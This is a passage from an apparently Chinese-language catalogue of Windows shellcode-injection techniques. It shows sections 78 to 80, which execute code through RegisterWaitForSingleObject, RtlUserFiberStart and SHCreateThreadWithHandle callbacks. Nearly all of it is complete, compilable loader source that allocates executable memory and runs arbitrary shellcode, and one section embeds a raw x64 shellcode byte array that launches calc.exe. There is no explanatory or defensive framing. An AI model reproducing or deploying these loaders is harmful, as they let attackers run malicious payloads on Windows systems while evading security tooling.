class="hljs-number">0x00000000</span>,&nbsp;<span class="hljs-number">0x0000</span>,&nbsp;<span class="hljs-number">0x0000</span>,&nbsp;{&nbsp;<span class="hljs-number">0x00</span>,&nbsp;<span class="hljs-number">0x0</span>,&nbsp;<span class="hljs-number">0x00</span>,&nbsp;<span class="hljs-number">0x00</span>,&nbsp;<span class="hljs-number">0x00</span>,&nbsp;<span class="hljs-number">0x00</span>,&nbsp;<span class="hljs-number">0x00</span>,&nbsp;<span class="hljs-number">0x00</span>&nbsp;}&nbsp;};<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;PERF_PROVIDER_CONTEXT&nbsp;sPPC&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;sPPC.MemAllocRoutine&nbsp;=&nbsp;(PERF_MEM_ALLOC)hAlloc;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;sPPC.ContextSize&nbsp;=&nbsp;<span class="hljs-keyword">sizeof</span>(PERF_PROVIDER_CONTEXT);<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;PerfStartProviderEx(&amp;ProviderGuid,&nbsp;&amp;sPPC,&nbsp;&amp;hProvider);<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>CLEANUP:<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hProvider)<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PerfStopProvider(hProvider);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">52</span>}<br><span class="linenum hljs-number">53</span><br><span class="linenum hljs-number">54</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">55</span></span>{<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">67</span><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">69</span>}<br></code></pre>
<h1 id="h78registerwaitforsingleobject"><span>78.回调函数注入 通过 RegisterWaitForSingleObject</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">11</span></span>{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">15</span><br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hFile&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hNewWaitObj&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;RegisterWaitForSingleObject.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;hFile&nbsp;=&nbsp;CreateFile(<span class="hljs-string">L"C:\\Windows\\explorer.exe"</span>,&nbsp;GENERIC_READ,&nbsp;FILE_SHARE_READ,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;OPEN_EXISTING,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_ATTRIBUTE_NORMAL&nbsp;|&nbsp;FILE_FLAG_OVERLAPPED,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;RegisterWaitForSingleObject(&amp;hNewWaitObj,&nbsp;hFile,&nbsp;(WAITORTIMERCALLBACK)hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;WT_EXECUTEONLYONCE);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;Sleep(<span class="hljs-number">1000</span>);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>CLEANUP:<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hFile)<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hFile);<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hNewWaitObj)<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UnregisterWait(hNewWaitObj);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">52</span>}<br><span class="linenum hljs-number">53</span><br><span class="linenum hljs-number">54</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">55</span></span>{<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">67</span><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">69</span>}<br></code></pre>
<h1 id="h79rtluserfiberstart"><span>79.回调函数注入 通过 RtlUserFiberStart</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;alfarom256</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>&nbsp;TEB_FIBERDATA_PTR_OFFSET&nbsp;0x17ee</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>&nbsp;LPFIBER_RIP_OFFSET&nbsp;0x0a8</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-comment">//&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number">10</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">11</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">29</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><span class="hljs-function"><span class="hljs-keyword">typedef</span>&nbsp;<span class="hljs-title">int</span><span class="hljs-params">(WINAPI*&nbsp;tRtlUserFiberStart)</span><span class="hljs-params">()</span></span>;<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;HMODULE&nbsp;hMod&nbsp;=&nbsp;GetModuleHandleA(<span class="hljs-string">"ntdll"</span>);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!hMod)&nbsp;{&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">-1</span>;&nbsp;}<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;tRtlUserFiberStart&nbsp;lpRtlUserFiberStart&nbsp;=&nbsp;(tRtlUserFiberStart)GetProcAddress(hMod,&nbsp;<span class="hljs-string">"RtlUserFiberStart"</span>);<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!lpRtlUserFiberStart)&nbsp;{&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">-1</span>;&nbsp;}<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;_TEB*&nbsp;teb&nbsp;=&nbsp;NtCurrentTeb();<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;NT_TIB*&nbsp;tib&nbsp;=&nbsp;(NT_TIB*)teb;<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">void</span>*&nbsp;pTebFlags&nbsp;=&nbsp;(<span class="hljs-keyword">void</span>*)((<span class="hljs-keyword">uintptr_t</span>)teb&nbsp;+&nbsp;TEB_FIBERDATA_PTR_OFFSET);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;*(<span class="hljs-keyword">char</span>*)pTebFlags&nbsp;=&nbsp;*(<span class="hljs-keyword">char</span>*)pTebFlags&nbsp;|&nbsp;<span class="hljs-number">0b100</span>;&nbsp;<span class="hljs-comment">//&nbsp;set&nbsp;the&nbsp;HasFiberData&nbsp;bit</span><br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!addr)&nbsp;{<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;GetLastError();<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">49</span><br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uintptr_t</span>&nbsp;lpDummyFiberData&nbsp;=&nbsp;(<span class="hljs-keyword">uintptr_t</span>)HeapAlloc(GetProcessHeap(),&nbsp;HEAP_ZERO_MEMORY,&nbsp;<span class="hljs-number">0x100</span>);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;*(LPVOID*)(lpDummyFiberData&nbsp;+&nbsp;<span class="hljs-number">0x0a8</span>)&nbsp;=&nbsp;addr;&nbsp;<span class="hljs-comment">//&nbsp;store&nbsp;the&nbsp;shelcode&nbsp;address&nbsp;at&nbsp;the&nbsp;offset&nbsp;of&nbsp;the&nbsp;FiberContext&nbsp;RIP&nbsp;in&nbsp;the&nbsp;Fiber&nbsp;Data</span><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[ntdll!_guard_dispatch_icall_fptr&nbsp;(00007ffa`218b4000)]&nbsp;ds:00007ffa`218b4000={ntdll!guard_dispatch_icall_nop&nbsp;(00007ffa`217cfa80)}</span><br><span class="linenum hljs-number">53</span><br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;__writegsqword(<span class="hljs-number">0x20</span>,&nbsp;lpDummyFiberData);&nbsp;<span class="hljs-comment">//&nbsp;set&nbsp;the&nbsp;FiberData&nbsp;pointer</span><br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;lpRtlUserFiberStart();<br><span class="linenum hljs-number">56</span>}<br></code></pre>
<h1 id="h80shcreatethreadwithhandle"><span>80.回调函数注入 通过 SHCreateThreadWithHandle</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Shlwapi.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;shlwapi.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hThread&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">19</span><br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;SHCreateThreadWithHandle.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;SHCreateThreadWithHandle(hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;&amp;hThread);<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;WaitForSingleObject(hThread,&nbsp;INFINITE);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>CLEANUP:<br><span class="linenum 